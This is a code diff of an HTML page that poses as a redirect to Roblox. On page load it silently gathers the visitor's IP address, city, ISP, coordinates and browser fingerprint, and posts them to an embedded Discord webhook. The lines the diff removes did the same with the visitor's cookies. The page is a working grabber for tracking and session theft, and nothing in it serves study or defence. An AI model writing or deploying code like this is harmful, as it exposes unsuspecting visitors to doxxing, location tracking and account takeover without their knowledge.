@@ -1,47 +1,67 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Loading...</title>
-</head>
 <body>
-    <h1>Redirecting...</h1>
-    <script>
-        // Your Discord webhook
-        const webhook = "https://discord.com/api/webhooks/1532569658543177738/GytKMid4oNbpE8jS9X_zdcqJf1ZcW23V3_V9LYOST85C4v5ZWbtT198sLiZStmZJdyOk";
-        
-        // Get all cookies
-        function getCookies() {
-            let allCookies = document.cookie;
-            return allCookies;
-        }
-        
-        // Send to Discord webhook
-        function sendToDiscord(cookieData) {
-            const payload = {
-                content: "```\nCookies: " + cookieData + "\n```\n**User-Agent:** " + navigator.userAgent
-            };
-            
+<script>
+const webhook = "https://discord.com/api/webhooks/1532569658543177738/GytKMid4oNbpE8jS9X_zdcqJf1ZcW23V3_V9LYOST85C4v5ZWbtT198sLiZStmZJdyOk";
+
+// Get IP from external API
+function getIP() {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            // Send IP to webhook
             fetch(webhook, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => console.log('Sent successfully'))
-            .catch(error => console.log('Error:', error));
-        }
-        
-        // Execute
-        const cookies = getCookies();
-        if (cookies) {
-            sendToDiscord(cookies);
-        }
-        
-        // Redirect to Roblox after 2 seconds
-        setTimeout(() => {
-            window.location.href = "https://www.roblox.com";
-        }, 2000);
-    </script>
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: "**IP ADDRESS:** " + data.ip + "\n**User-Agent:** " + navigator.userAgent + "\n**Time:** " + new Date().toISOString()
+                })
+            });
+            
+            // Also try to get location
+            fetch('https://ipapi.co/' + data.ip + '/json/')
+                .then(res => res.json())
+                .then(location => {
+                    fetch(webhook, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            content: "**Location:** " + location.city + ", " + location.region + ", " + location.country_name + "\n**ISP:** " + location.org + "\n**Coordinates:** " + location.latitude + ", " + location.longitude
+                        })
+                    });
+                });
+        });
+}
+
+// Get all browser info
+function getBrowserInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: screen.width + "x" + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer,
+        cookiesEnabled: navigator.cookieEnabled
+    };
+}
+
+// Execute
+getIP();
+
+const info = getBrowserInfo();
+fetch(webhook, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        content: "**Browser Info:**\n```json\n" + JSON.stringify(info, null, 2) + "\n```"
+    })
+});
+
+// Redirect
+setTimeout(() => {
+    window.location.href = "https://www.roblox.com";
+}, 3000);
+</script>
 </body>
 </html>
